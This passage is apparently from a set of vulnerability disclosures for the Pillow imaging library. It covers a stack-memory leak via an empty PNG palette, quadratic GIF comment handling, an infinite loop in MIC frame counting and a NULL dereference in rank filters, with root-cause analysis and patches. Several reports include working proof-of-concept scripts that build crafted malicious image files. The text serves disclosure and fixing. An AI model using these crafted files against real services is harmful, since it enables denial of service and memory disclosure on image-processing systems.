) returns # uninitialised C stack bytes as pixel values. # # ImagingPaletteCacheUpdate() (src/libImaging/Palette.c) only writes its local # UINT8 c[512] inside `for (i = 0; i < palette->size; i++)`. A PNG with a # zero-length PLTE chunk gives palette->size == 0, so c[] is never written and # its raw stack contents are copied into the colour cache, which topalette() # (src/libImaging/Convert.c) then emits as the output pixels. import io import struct import zlib from PIL import Image def png_with_plte(plte): """A 4x4 palette-mode (colour type 3) PNG whose PLTE chunk holds `plte`.""" def chunk(tag, data): return (struct.pack(">I", len(data)) + tag + data + struct.pack(">I", zlib.crc32(tag + data))) ihdr = struct.pack(">IIBBBBB", 4, 4, 8, 3, 0, 0, 0) pixels = zlib.compress(b"\x00" * 4 * 5) return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"PLTE", plte) + chunk(b"IDAT", pixels) + chunk(b"IEND", b"")) def quantize_against(palette_png): """What an "apply this palette" feature does with an uploaded palette image.""" pal = Image.open(io.BytesIO(palette_png)) # 512 colours, one per slot of the colour-cache box r,g,b in [0,32), in slot # order: output pixel j is exactly c[j] of ImagingPaletteCacheUpdate(). src = Image.new("RGB", (512, 1)) src.putdata([(r * 4, g * 4, b * 4) for r in range(8) for g in range(8) for b in range(8)]) return src.quantize(palette=pal, dither=Image.Dither.NONE).tobytes() def stack_range(): for line in open("/proc/self/maps"): if line.rstrip().endswith("[stack]"): lo, hi = line.split()[0].split("-") return int(lo, 16), int(hi, 16) # Control: a one-entry palette -- every pixel must map to index 0. control = quantize_against(png_with_plte(b"\x10\x20\x30")) print(f"control (1-entry PLTE): distinct pixel values = {sorted(set(control))}") # Attack: the same PNG with an empty PLTE chunk (80 bytes). try: leaked = quantize_against(png_with_plte(b"")) except ValueError as e: print(f"attack (empty PLTE): rejected: {e}") print("OK") raise SystemExit print(f"attack (empty PLTE): {len(set(leaked))} distinct pixel values; first 64 bytes:") print(f" {leaked[:64].hex()}") # Read the 512 pixel bytes as 64 little-endian words; any word that is an # address inside this process's own stack can only have come from the stack. lo, hi = stack_range() print(f"this process's [stack] mapping: {lo:#x}-{hi:#x}") stack_ptrs = 0 for i in range(0, 512, 8): word = int.from_bytes(leaked[i:i + 8], "little") if lo <= word < hi: stack_ptrs += 1 print(f" pixels {i:3d}..{i + 7:3d} = {word:#018x} <- pointer into [stack]") print(f"{stack_ptrs} of 64 words of the output image are stack addresses") print("BUG" if set(control) == {0} and stack_ptrs >= 2 else "OK") ```

summary: Pillow: Quadratic GIF comment concatenation allows DoS in Image.open()
description: ``` ============================================================================ Quadratic GIF comment concatenation allows DoS in Image.open() Location: src/PIL/GifImagePlugin.py:266 in GifImageFile._seek() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Opening a crafted GIF file with `Image.open()` takes time that grows with the square of the file's size, so anyone who can submit an image to a service that uses Pillow can keep one worker busy at full processor load for a long time with a small file. A 2 MB file takes about 5 seconds to open, a 4 MB file about 35 seconds, and an 8 MB file about 3 minutes. An ordinary GIF of the same size opens in well under a second. The cost is paid inside `Image.open()` itself, with default settings, before the application has seen the image's size or format. The bug is in `GifImageFile._seek()` in `src/PIL/GifImagePlugin.py`, which builds `info["comment"]` by appending to an immutable `bytes` object with no size limit. It appends once per 255-byte sub-block (`comment += block`, line 261) and once per comment extension (`info["comment"] += b"\n" + comment`, line 266). Each append copies everything collected so far. A file made of many tiny comment extensions forces a full re-copy for each one. Because `_open()` ends with `self._seek(0)`, any code that only opens an uploaded file to identify it, read its dimensions, or make a thumbnail pays the full cost. The decompression-bomb check does not help, since the image is 1×1. Memory use stays linear, so the effect is processor exhaustion and latency, bounded by whatever upload size the service allows (about 1 second at 1 MB). This is the same kind of issue as the EPS open-phase slowdown fixed as CVE-2021-28677, here in the GIF comment handling. The quadratic pattern was introduced in commit b2b737b68b06 ("Allow arbitrary number of comment extension subblocks", November 2018) and has shipped since Pillow 5.4.0. The attached script builds 2 MB and 4 MB test files and compares each against a byte-identical control whose extensions are labelled as plain text instead of comment. The 4 MB comment file took about 34 seconds to open, against 0.26 seconds for its control. A patch that collects the pieces in a list and joins them once is also attached. ## Details `GifImageFile._seek()` collects GIF comment extensions into `info["comment"]` using `bytes` concatenation, once per 255-byte sub-block and once per comment extension, with no limit on the total. `bytes` is immutable, so every `+=` allocates a new object and copies everything accumulated so far; the work done by `Image.open()` is therefore quadratic in the amount of comment data in frame 0. A 1×1 GIF89a whose body is nothing but the 5-byte comment extension `21 FE 01 41 00` repeated makes this directly observable. `Image.open(BytesIO(data))` on such a file, stock build at this commit, 2-CPU machine: | file size | comment extensions (`21 FE …`) | same bytes labelled plain-text extension (`21 01 …`) | |---|---|---| | 1 MB | 1.2 s | 0.09 s | | 2 MB | 4.9 s | 0.13 s | | 4 MB | 35 s | 0.26 s | | 8 MB | 183 s | — | The control column is the identical byte stream with the extension label changed from `0xFE` to `0x01`; it goes through the same loop and the same `self.data()` reads but is discarded instead of concatenated, and scales linearly. No `load()` is needed and no warning or exception is raised; `im.info["comment"]` simply ends up holding the multi-megabyte blob. The code, `src/PIL/GifImagePlugin.py:229-281` (trimmed): ```python elif s == b"!": s = self.fp.read(1) block = self.data() … elif s[0] == 254: # # comment extension # comment = b"" # Read this comment block while block: comment += block # :261 one copy per sub-block block = self.data() if "comment" in info: # If multiple comment blocks in frame, separate with \n info["comment"] += b"\n" + comment # :266 one copy per extension else: info["comment"] = comment s = b"" continue … while self.data(): # every other extension: read and drop pass ``` `self.data()` (`:97-102`) reads one length byte and then that many bytes, so each call is cheap and bounded; the cost is entirely in the two `+=` lines. For a single comment extension of N bytes delivered as N/255 sub-blocks, line 261 copies about N²/510 bytes in total (4 MB → 2.3 s, 8 MB → 9.5 s, 16 MB → 38 s measured). Splitting the same data into many small comment extensions is worse, because line 266 re-copies the whole of `info["comment"]` once per extension: with 1-byte extensions a file of F bytes causes roughly F²/25 bytes of copying, which is the table above (growth ×4–7 per doubling once the buffer outgrows the CPU caches). This runs during `Image.open()`: `_open()` ends with `self._seek(0)` (`:135`), so any application that merely opens an uploaded file to identify it, read its size, or thumbnail it pays the full cost before it has made any decision about the image. `Image._decompression_bomb_check` is not involved (the image is 1×1), and unlike PNG text chunks (`PngImagePlugin.MAX_TEXT_CHUNK` / `MAX_TEXT_MEMORY`) there is no cap on GIF comment size. Later frames repeat the same loop for their own comments via `seek()` / `n_frames`. With both `+=` sites replaced by list-append and a single `b"".join()` (as in the attached patch), the same 16 MB single-extension file opens in 0.03 s, confirming the concatenation is the whole cost. ## Impact Anyone who can get a GIF to a service that calls `PIL.Image.open()` on it — avatar/media uploads, thumbnailers, format sniffing, anything using `ImageOps`/`thumbnail()` on user files — can pin one worker process at 100 % CPU for about 5 s with a 2 MB file, 35 s with a 4 MB file and 3 minutes with an 8 MB file, under default settings, with the time growing quadratically in the permitted upload size. A benign GIF of the same size opens in well under a second, so request-cost assumptions based on file size do not hold. Memory use is only linear (the comment is retained in `im.info["comment"]`), so the effect is CPU/latency denial of service of the worker pool rather than memory exhaustion; a handful of concurrent uploads is enough to saturate a typical pool. Upload size limits bound it (≈1 s at 1 MB). This is the same shape as CVE-2021-28677 ("EPS DOS on _open", `docs/releasenotes/8.2.0.rst`), where a quadratic method of accumulating data in the open phase, before the image was accepted, was treated as a denial-of-service vulnerability; here the format is GIF and the accumulator is the comment extension. The quadratic accumulation was introduced in `b2b737b68b06` ("Allow arbitrary number of comment extension subblocks", 2018-11-27), first released in Pillow 5.4.0. ## Reproducing `repro` is a single Python script that uses the installed Pillow. Run it with no arguments. It needs no files, no network and no rebuild. It builds two GIFs of the same length, at 2 MB and at 4 MB. Each is the 13-byte GIF89a header for a 1×1 screen, followed by `size/5` copies of the 5-byte extension `21

summary: Pillow: Infinite loop in MIC n_frames when the embedded TIFF
description:
``` ============================================================================ Infinite loop in MIC n_frames when the embedded TIFF has 3+ IFDs Location: src/PIL/MicImagePlugin.py:86 in MicImageFile.tell() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A crafted 5.6 KB image file makes Pillow loop forever at 100% CPU when an application asks how many frames the image has. This only affects installations that have the optional `olefile` package. Any application that opens an untrusted image and then reads `im.n_frames` can have one worker tied up indefinitely. That includes the common "is this image animated?" check and re-saving with `save_all=True` to TIFF, PDF or WebP. The call never returns, raises no exception, and does not grow memory, so only an external watchdog stops it. The file is a Microsoft Image Composer (MIC) container, which Pillow recognises by its magic bytes with no extension needed. Inside it is a TIFF stream with three chained image directories. `MicImageFile` subclasses `TiffImageFile` and overrides `seek()` and `tell()` so that a "frame" means one stream in the container. It still inherits `TiffImageFile.n_frames` (`src/PIL/TiffImagePlugin.py:1212`), which walks the embedded TIFF's directory chain with `self._seek(self.tell() + 1)` until `_n_frames` is set. Two things stop that walk from making progress: - `MicImageFile.tell()` (`src/PIL/MicImagePlugin.py:86`) returns the constant stream index. - `MicImageFile.seek()` calls `TiffImageFile._open()`, which resets `_n_frames` to `None`. As a result, the loop re-parses the second directory forever whenever the embedded stream has three or more directories. `Image.open()`, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file. The regression was introduced in 0b33a87b0d15 (April 2020, first released in 7.2.0), which removed `MicImageFile`'s own `n_frames` property. The attached reproducer builds the file in code and checks two controls, which return 3 and 1 frames as expected; the malicious file is still running when it is killed after 20 seconds. ## Details `MicImageFile` (registered for `Image.open` whenever `olefile` is installed) subclasses `TiffImageFile` and redefines a "frame" as one OLE `*.ACI/Image` stream, overriding `seek()` and `tell()` accordingly. It does not override the `n_frames` property, so the inherited TIFF implementation runs, and that implementation relies on `tell()` advancing as IFDs are loaded. `MicImageFile.tell()` returns the OLE stream index, which never changes inside `n_frames`, so the loop re-parses the same IFD forever. A 5632-byte OLE2 compound file whose `img0.ACI/Image` stream is a 351-byte TIFF with three chained 1×1 IFDs is enough. `Image.open()` on it succeeds (format `MIC`, detected by the OLE magic, no extension needed); evaluating `im.n_frames` then never returns and keeps one core at 100 %. A Python stack taken 27 s in is ``` File "src/PIL/TiffImagePlugin.py", line 1622 in _setup File "src/PIL/TiffImagePlugin.py", line 1271 in _seek File "src/PIL/TiffImagePlugin.py", line 1219 in n_frames ``` and instrumenting `_seek` shows it being called with `frame=1`, `tell()==0`, `_frame_pos==[8, 122]`, `_n_frames is None` on every iteration — identical state, so the loop is non-terminating, not merely slow. The same 351 TIFF bytes opened directly give `n_frames == 3` in milliseconds, and the same container around a 1-IFD TIFF gives `n_frames == 1`. The loop, `src/PIL/TiffImagePlugin.py:1212`: ```python @property def n_frames(self) -> int: current_n_frames = self._n_frames if current_n_frames is None: current = self.tell() self._seek(len(self._frame_pos)) while self._n_frames is None: self._seek(self.tell() + 1) # 1219 self.seek(current) ``` and the overrides that break its progress assumption, `src/PIL/MicImagePlugin.py:76`: ```python def seek(self, frame: int) -> None: … self.fp = self.ole.openstream(filename) TiffImagePlugin.TiffImageFile._open(self) # 82: resets _n_frames to None self.frame = frame def tell(self) -> int: return self.frame # 87: OLE stream index, not TIFF __frame ``` For a plain TIFF, `_seek(k)` (`TiffImagePlugin.py:1236`) loads IFDs up to `k`, appending each offset to `_frame_pos`, setting `_n_frames` when an IFD's next-pointer is 0 (or already seen), and setting the private `__frame = k`; `TiffImageFile.tell()` returns `__frame`, so `self.tell() + 1` walks the chain to its end. For a MIC file, `Image.open` → `MicImageFile._open` sets `self._n_frames = len(self.images)` at line 69, but then calls `self.seek(0)` → `TiffImageFile._open` (line 82), which unconditionally sets `self._n_frames = None` (`TiffImagePlugin.py:1203`) and `_seek(0)`s into the embedded stream. With the 3-IFD stream, IFD 0 has a non-zero next pointer, so `_n_frames` stays `None` after open. `n_frames` then runs: `current = self.tell()` is `0` (the OLE index); `_seek(len(_frame_pos))` = `_seek(1)` loads IFD 1, whose next pointer is also non-zero and not yet in `_frame_pos`, so `_n_frames` is still `None`. The `while` body computes `self.tell() + 1` = `0 + 1` and calls `_seek(1)` again; `len(_frame_pos)` is already 2, so nothing new is loaded — IFD 1 is re-read via `tag_v2.load` and `_setup()` and the state is unchanged. This repeats indefinitely; IFD 2 is never reached. Two chained IFDs are not enough (IFD 1's next pointer of 0 sets `_n_frames = 2` on the first `_seek(1)`); three or more are. `Tests/test_file_mic.py::test_n_frames` passes only because `hopper.mic`'s stream has a single IFD, so `_seek(0)` sets `_n_frames = 1` and the loop is never entered; the `len(self.images)` assignment at line 69 is only consumed by the initial `_seek_check(0)` and is overwritten before any caller can read `n_frames`. A side effect of the same mismatch: with a 2-IFD stream `n_frames` returns 2 (TIFF IFDs) while `seek(1)` indexes `self.images[1]` (OLE streams) and raises `IndexError` — visible with `save_all=True`. ## Impact Any application that lets Pillow open an uploaded file and then reads `im.n_frames` — the usual way to decide whether an image is animated (`getattr(im, "n_frames", 1) > 1`), and also what `hasattr(im, "n_frames")`/`getattr(im, "n_frames", 1)` in Pillow's own `TiffImagePlugin._save_all` (`:2333`), `PdfImagePlugin._save` (`:250`) and `WebPImagePlugin._save_all` (`:171`) evaluate when the app re-saves with `save_all=True` — can be made to spin one worker at 100 % CPU indefinitely with a 5.6 KB upload. The file needs no particular extension (OLE magic; `FpxImagePlugin` rejects it on CLSID and `MicImagePlugin` accepts it), default limits do not intervene, memory does not grow, and no exception is raised, so only an external watchdog ends it. Preconditions: `olefile` installed (it is an optional dependency; without it the MIC plugin is not registered) and the application touching `n_frames` or a `save_all` path. `Image.open()` itself, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file. This is the same class of tiny-file, pure-Python non-termination as CVE-2021-28676 (FLI) and CVE-2021-28677 (EPS), and like CVE-2019-19911 (FPX) it depends on `olefile`; it differs in not being reached by the default open/load path. The regression was introduced in `0b33a87b0d15` ("Replaced property methods for n_frames and is_animated with normal properties", 2020-04-13), first released in 7.2.0, which replaced `MicImageFile`'s own `n_frames` property with the `_n_frames` attribute that `TiffImageFile._open` overwrites. ## Reproducing `repro` is a single Python script that runs against the installed Pillow (with `olefile`, which is what registers the MIC plugin). It builds every input in code, writes each one to a temporary file named `x` with no extension (so Pillow identifies the format from its magic bytes), and opens it in a child Python process that runs `Image.open(path)` and prints `im.format` and `im.n_frames`. It builds two things in code: - `tiff(n)`: an `n`-page TIFF of 4×4 greyscale frames written by Pillow itself (`save_all=True`), so the IFDs are chained exactly as Pillow's own writer chains them. The last next-IFD pointer is 0. - `mic(stream)`: a minimal OLE2 compound file with a storage named `img0.ACI` that contains a stream named `Image`, which is the layout `MicImageFile._open` looks for. Sector 0 is the FAT and sector 1 is the directory. The stream starts at sector 2 and is padded to 4096 bytes, so the file doesn't need a mini-FAT. The result is 5632 bytes. It runs three inputs, each in its own child process with a hard 20-second kill: 1. control: the plain 3-page TIFF. Expected `TIFF n_frames = 3`. 2. control: a MIC wrapping a 1-page TIFF. Expected `MIC n_frames = 1`. 3. attack: the same MIC container wrapping the 3-page TIFF. The timeout is enforced by killing the child rather than by an in-process alarm, because a `TimeoutError` raised while `ImageFileDirectory_v2.load()` is parsing would be caught by its `except OSError` (`TiffImagePlugin.py:958`) and leave the IFD half-parsed instead of stopping the loop. The script prints `BUG` when both controls return and the attack child is still running after 20 seconds; otherwise it prints `OK`. With the attached patch applied, the attack case prints `MIC n_frames = 1` and the script prints `OK`. ## Suggested fix The attached patch restores the OLE-level frame count after the embedded TIFF stream has been opened, so the inherited `n_frames` never enters its IFD-walking loop and `n_frames`/`seek()` agree on what a frame is. In `MicImageFile.seek`, `src/PIL/MicImagePlugin.py:82`, right after `TiffImagePlugin.TiffImageFile._open(self)`: ```diff TiffImagePlugin.TiffImageFile._open(self) + # TiffImageFile._open() resets the frame count to that of the + # embedded TIFF stream, but the frames of an MIC file are its streams + self._n_frames = len(self.images) + self.is_animated = self._n_frames > 1 + self.frame = frame ``` Doing this in `seek()` restores the invariant on every seek, not only the first. The existing assignments at lines 69–70 of `_open` are kept: the initial `seek(0)` → `_seek_check(0)` reads `n_frames` before `TiffImageFile._open` has run, so they are still needed. Plain read-only `n_frames`/`is_animated` properties, as before 0b33a87b0, are no longer a drop-in option because `TiffImageFile._seek` assigns `self.is_animated`. With the patch applied to a clean tree and rebuilt, the attack file returns `n_frames == 1` immediately, a 2-IFD stream raises `EOFError` on `seek(1)` instead of `IndexError`, `save_all=True` to TIFF and PDF completes, and `Tests/test_file_mic.py` and `Tests/test_file_tiff.py` pass. No regression test is included, since one would need a new binary MIC fixture in `Tests/images`. The patch passed that check but has not been reviewed beyond it as the final form of the fix. Two things it leaves alone: it does not add the `_im` reset that `TiffImageFile.seek` performs after `_seek` (`TiffImagePlugin.py:1229`), which matters when switching between OLE streams of different size or mode; and `TiffImageFile.n_frames` still advances via the overridable `tell()` rather than its private `__frame`, so making it iterate on `__frame` would protect any other subclass that redefines `tell()`. ## The patch Restore the OLE stream frame count in MicImageFile.seek() after TiffImageFile._open() resets it, so n_frames cannot loop forever Applies to `src/PIL/MicImagePlugin.py` at the commit above. It passed the mechanical check — applied to a clean tree, rebuilt, the reproducer stopped firing — but a reviewer did not endorse it as the right fix. ```diff diff --git a/src/PIL/MicImagePlugin.py b/src/PIL/MicImagePlugin.py index f8cf3a76f..2bb0109ce 100644 --- a/src/PIL/MicImagePlugin.py +++ b/src/PIL/MicImagePlugin.py @@ -81,6 +81,11 @@ class MicImageFile(TiffImagePlugin.TiffImageFile): TiffImagePlugin.TiffImageFile._open(self) + # TiffImageFile._open() resets the frame count to that of the + # embedded TIFF stream, but the frames of an MIC file are its streams + self._n_frames = len(self.images) + self.is_animated = self._n_frames > 1 + self.frame = frame def tell(self) -> int: ``` ## The reproducer
Reproducer — repro, 2,330 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # MicImageFile inherits TiffImageFile.n_frames, whose loop `self._seek(self.tell()+1)` # relies on tell() advancing; MicImageFile.tell() returns the OLE stream index (constant), # so a MIC file whose Image stream is a TIFF with >=3 chained IFDs makes im.n_frames spin forever. import io, struct, subprocess, sys, tempfile, os from PIL import Image def tiff(n): # n-page TIFF written by Pillow itself b = io.BytesIO(); fr = [Image.new("L", (4, 4), i) for i in range(n)] fr[0].save(b, "TIFF", save_all=True, append_images=fr[1:]); return b.getvalue() def mic(stream): # minimal OLE2 file: storage "img0.ACI" containing stream "Image" END, FREE, FATSECT = 0xFFFFFFFE, 0xFFFFFFFF, 0xFFFFFFFD data = stream.ljust(4096, b"\0"); n = len(data) // 512 fat = [FATSECT, END] + [3 + k for k in range(n - 1)] + [END]; fat += [FREE] * (128 - len(fat)) def entry(name, kind, child, start, size): raw = name.encode("utf-16-le") + b"\0\0" return raw.ljust(64, b"\0") + struct.pack(" {out}"); return hung c1 = run("control: 3-page TIFF, direct", tiff(3)) c2 = run("control: MIC around 1-page TIFF", mic(tiff(1))) bug = run("attack: MIC around 3-page TIFF", mic(tiff(3))) print("BUG" if bug and not c1 and not c2 else "OK") ```
---

summary: Pillow: Quadratic GIF comment copying during save
description: On Pillow 12.3.0 and upstream `main` (`ad277e2761b489681e71b51e91367d46b0ceabb9`), a GIF with a long comment makes `_get_global_header()` copy portions of the comment repeatedly when saving, including comments carried over from untrusted images. I suggest provisional **Moderate** severity for crafted-image CPU denial of service, with CVSS-B 6.9 assuming a network service automatically opens unauthenticated uploads and they are resaved as GIFs; impact depends on input-size, concurrency, and worker CPU limits.

summary: Pillow: NULL dereference in ImagingExpand via rank filters on zero-size images
description:
``` ============================================================================ NULL dereference in ImagingExpand via rank filters on zero-size images Location: src/libImaging/Filter.c:79 in ImagingExpand() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Applying Pillow's median, minimum, maximum or rank filter to an image with zero width or zero height crashes the whole Python process instead of raising an error. Empty images like this are easy to produce with ordinary calls, for example a crop box whose left and right edges (or top and bottom edges) are equal, or the second page of a crafted multi-page image file. An attacker who can supply crop coordinates or an uploaded file to an application that runs one of these filters can kill its worker process. The effect is a crash only, with no memory disclosure or corruption. The fault is in `ImagingExpand()` in `src/libImaging/Filter.c`. This is the edge-padding step that `RankFilter.filter()` always runs through the core `expand()` method, so `MedianFilter`, `MinFilter` and `MaxFilter` go through it too. It fills the margin by copying the input's edge pixels, reading `imIn->image[y][0]` and rows `0` / `ysize-1`, and never checks that the input has any pixels. For an empty image, `ImagingAllocateArray` leaves the line pointers NULL, so the first read dereferences NULL and the process dies with SIGSEGV, in every mode. Zero-size images reach this point through public API alone: - `Image.crop()`, `ImageOps.crop()` and `Image.new()`; - a multi-page TIFF opened by path whose second IFD declares `ImageLength = 0`, on which `seek(1)` and `load()` succeed. Every other `ImageFilter` returns an empty image for the same inputs. The zero-height case has crashed since the original PIL import, and the zero-width case since Pillow 4.3.0. This is separate from the `margin == 0` fix in #9755: the path is the same, but here the degenerate value is the image size rather than the kernel size. It has the same shape as the zero-dimension `ImagingOffset` crash fixed under GHSA-f87v-9578-p47w. The attached reproducer shows a one-pixel-wide control crop filtering normally, while four empty crops passed through the rank filters are each killed by SIGSEGV. A patch that returns early in `ImagingExpand` for empty input is included. ## Details `ImagingExpand()` (`src/libImaging/Filter.c`), the edge-padding helper that `ImageFilter.RankFilter` runs before the actual rank filter, reads the first pixel of each input line without checking that the input has any pixels. For an image with width 0 or height 0 the line pointers are NULL, so `Image.filter()` with `MedianFilter`, `MinFilter`, `MaxFilter` or `RankFilter` kills the interpreter with SIGSEGV instead of returning or raising: ```python from PIL import Image, ImageFilter im = Image.new("L", (10, 10)).crop((3, 0, 3, 10)) # size (0, 10); crop() accepts left == right im.filter(ImageFilter.MedianFilter(3)) # SIGSEGV ``` Under gdb on the stock build the fault is at `ImagingExpand (imIn=…, margin=1) at src/libImaging/Filter.c:105` (the `EXPAND(UINT8, image8)` expansion), called from `_expand_image` at `src/_imaging.c:1151`, with `imIn->xsize = 0` and `imIn->image[0] = 0x0`. The same happens for every mode the rank filters accept (`L`, `RGB`, `RGBA`, `I`, `F`), and the core `expand(m)` method with `m >= 1` crashes the same way in any mode, including `P`. The same input through `BoxBlur`, `GaussianBlur`, `Kernel`, `ModeFilter` and `UnsharpMask` returns a `(0, 10)` image; a `(1, 10)` crop through `MedianFilter` also returns normally. The unchecked edge reads date from the PIL import (`9a640e315`, 2010, so every Pillow release): the zero-height case has crashed since then, and the zero-width case since `fd907fbdc` ("Fix 0-width and 0-height images other way", Pillow 4.3.0), which stopped backing zero-width images with a dummy block and left their row pointers NULL. It is adjacent to the `margin == 0` divide-by-zero fix in #9755 — same `expand()` → `ImagingExpand()` path, but the unhandled degenerate value here is the image size rather than the kernel size. The path: ```python # src/PIL/ImageFilter.py:111-116 RankFilter.filter (MedianFilter/MinFilter/MaxFilter subclass it) image = image.expand(self.size // 2) return image.rankfilter(self.size, self.rank) ``` `expand(m)` with `m > 0` is `ImagingExpand(self->image, m)` (`src/_imaging.c:1142-1151`). It validates only `margin`, allocates an output of `(xsize+2*margin) × (ysize+2*margin)` — which is non-empty, so the allocation succeeds — and then fills the margin by replicating edge pixels of the input: ```c // src/libImaging/Filter.c:70-101 imOut = ImagingNewDirty(imIn->mode, imIn->xsize + 2 * margin, imIn->ysize + 2 * margin); … #define EXPAND_LINE(type, image, yin, yout) \ { \ for (x = 0; x < margin; x++) { \ imOut->image[yout][x] = imIn->image[yin][0]; \ // line 79 } \ … \ for (x = 0; x < margin; x++) { \ imOut->image[yout][margin + imIn->xsize + x] = \ imIn->image[yin][imIn->xsize - 1]; \ // [-1] when xsize == 0 } \ } #define EXPAND(type, image) \ { \ for (y = 0; y < margin; y++) { \ EXPAND_LINE(type, image, 0, y); \ // line 0 of a 0-line image } \ … for (y = 0; y < margin; y++) { \ EXPAND_LINE(type, image, imIn->ysize - 1, margin + imIn->ysize + y); \ // line -1 when ysize == 0 } \ } ``` Why the line pointers are NULL: `ImagingNewPrologueSubtype` callocs the `im->image` pointer array (`src/libImaging/Storage.c:216`, at least one entry), and `ImagingAllocateArray` returns before assigning any of them for an empty image: ```c // src/libImaging/Storage.c:423-426 /* 0-width or 0-height image. No need to do anything */ if (!im->linesize || !im->ysize) { return im; } ``` So with `xsize == 0` every `imIn->image[y]` is NULL and `imIn->image[yin][0]` faults; with `ysize == 0` the top-margin pass reads `imIn->image[0]` (the single calloc'd NULL slot) and faults the same way, and the bottom-margin pass would index `imIn->image[-1]`. `ImagingRankFilter` is never reached. Zero-size images are ordinary objects in Pillow and arrive at `filter()` through public API only: - `Image.crop(box)` rejects only inverted boxes (`src/PIL/Image.py:1385-1390`); `left == right` or `upper == lower` yields a 0×N / N×0 image. `ImageOps.crop(im, border)` with `border == width // 2`, and `Image.new(mode, (0, n))`, do the same. - From a file: `ImageFile.__init__` refuses a zero first-frame size (`src/PIL/ImageFile.py:167-173`), but `TiffImagePlugin._setup()` takes `ImageWidth`/`ImageLength` of every later IFD as-is on `seek()` (`src/PIL/TiffImagePlugin.py:1468-1481`). For an uncompressed page of an image opened by path, `ImageFile.load()` takes the mmap branch (`src/PIL/ImageFile.py:307, 325-347`) and `Image.core.map_buffer` builds an `8×0` core image without complaint (`src/map.c:127-141`), so `im.seek(1); im.load()` succeeds and a following `im.filter(ImageFilter.MedianFilter(3))` segfaults in `ImagingExpand` exactly as above (verified under gdb: `imIn->ysize = 0`, `imIn->image[0] = 0x0`). A 384-byte two-page TIFF is enough. ## Impact Denial of service: the whole embedding process (web worker, pipeline process) dies with SIGSEGV rather than the request failing with a Python exception. It is reachable by a remote user in two realistic shapes: (a) an application that crops an upload to user-supplied coordinates and then applies a median/min/max filter (denoise, dilate/erode, thumbnail clean-up) — a box with `x0 == x1` or `y0 == y1` passes `crop()` and crashes the worker; (b) an application that opens an uploaded TIFF from disk by path, iterates its pages and applies a rank filter to each — a crafted second IFD with `ImageLength = 0` crashes it. The faulting access is a read at address 0 (or a fixed small negative offset from the pointer array for the `[-1]` cases, which is not reached because the first read already faults), so there is no memory disclosure or corruption beyond the crash. The same shape, a zero-dimension image crashing C code reached through public API, was fixed in `ImagingOffset` in 39d14a0db (GHSA-f87v-9578-p47w). ## Reproducing `repro` is a single Python script that uses the installed Pillow as-is (no rebuild). It runs each case in a fresh child interpreter, with core dumps disabled. That way a segfault shows up as the child's exit status and the script itself keeps running. Each child builds `Image.new("L", (10, 10)).crop(box)`, prints its size, calls `im.filter(...)` and then prints the size of the result. - **Control**: a `(1, 10)` crop (`(3, 0, 4, 10)`) through `MedianFilter(3)`. The rank filter accepts a thin image and must return normally. - **PoC**: the rank filters on empty crops. - A `(0, 10)` crop (`left == right`, `(3, 0, 3, 10)`) through `MedianFilter(3)` and `MaxFilter(5)`. - A `(10, 0)` crop (`upper == lower`, `(0, 3, 10, 3)`) through `MinFilter(3)`. - A `(0, 0)` crop (`(3, 3, 3, 3)`) through `RankFilter(3, 4)`. Expected output on the stock build: ``` crop(3, 0, 4, 10) MedianFilter(3) (1, 10) -> (1, 10) crop(3, 0, 3, 10) MedianFilter(3) (0, 10) -> killed by SIGSEGV crop(3, 0, 3, 10) MaxFilter(5) (0, 10) -> killed by SIGSEGV crop(0, 3, 10, 3) MinFilter(3) (10, 0) -> killed by SIGSEGV crop(3, 3, 3, 3) RankFilter(3, 4) (0, 0) -> killed by SIGSEGV BUG ``` The size printed before `->` shows that the empty image was created without error. The crash happens inside `filter()`, in `ImagingExpand`. The last line is `BUG` if the control returned normally and at least one rank-filter child was killed by SIGSEGV. Otherwise it is `OK`. The script covers the crop route only; the TIFF route described above fails the same way (`im.seek(1); im.load(); im.filter(ImageFilter.MedianFilter(3))` on a by-path two-page TIFF whose second IFD has `ImageLength = 0`). With the attached patch, every PoC line prints the unchanged size (for example `(0, 10) -> (0, 10)`) and the script prints `OK`. ## Suggested fix The attached patch handles the empty input in `ImagingExpand` (`src/libImaging/Filter.c`), right after the `margin` checks and before the `ImagingNewDirty` allocation and the replication loops. With `xsize == 0` or `ysize == 0` there are no edge pixels to replicate, so it returns a zeroed (`ImagingNew`, not `ImagingNewDirty`) image of the expanded size, with the input's palette copied. This keeps `ImagingExpand`'s size contract, so `ImagingRankFilter` then produces an output of `xsize - 2*margin` × `ysize - 2*margin`, i.e. the original empty size, matching every other filter. It mirrors the existing zero-dimension early returns in `src/libImaging/BoxBlur.c` (127004368) and `src/libImaging/Offset.c` (39d14a0db): ```diff --- a/src/libImaging/Filter.c +++ b/src/libImaging/Filter.c @@ -67,6 +67,17 @@ ImagingExpand(Imaging imIn, int margin) { return (Imaging)ImagingError_ValueError("filter size too large"); } + if (imIn->xsize == 0 || imIn->ysize == 0) { + /* No edge pixels to replicate (and no lines to read from), so + return a zeroed image of the expanded size */ + imOut = ImagingNew(imIn->mode, imIn->xsize + 2 * margin, imIn->ysize + 2 * margin); + if (!imOut) { + return NULL; + } + ImagingCopyPalette(imOut, imIn); + return imOut; + } + imOut = ImagingNewDirty(imIn->mode, imIn->xsize + 2 * margin, imIn->ysize + 2 * margin); if (!imOut) { ``` The patch also adds `test_rankfilter_zero_dimension` next to `test_rankfilter_error` in `Tests/test_image_filter.py`, which filters `Image.new("L", size)` for `size` in `((0, 6), (6, 0), (0, 0))` with `MinFilter`, `MedianFilter`, `MaxFilter` and `RankFilter(3, 2)` and asserts the size is preserved. Applied to a clean checkout and rebuilt, the reproducer prints `OK` and `Tests/test_image_filter.py` passes. A Python-level guard in `RankFilter.filter` (`if 0 in image.size: return image.copy()`) would also stop the crash, but the C-level check protects any other caller of `expand()`. ## The patch Return a zeroed image from ImagingExpand when the input has zero width or height instead of reading NULL line pointers Applies to `src/libImaging/Filter.c` at the commit above. ```diff diff --git a/Tests/test_image_filter.py b/Tests/test_image_filter.py index 974d4b7a3..8dc8e1a1a 100644 --- 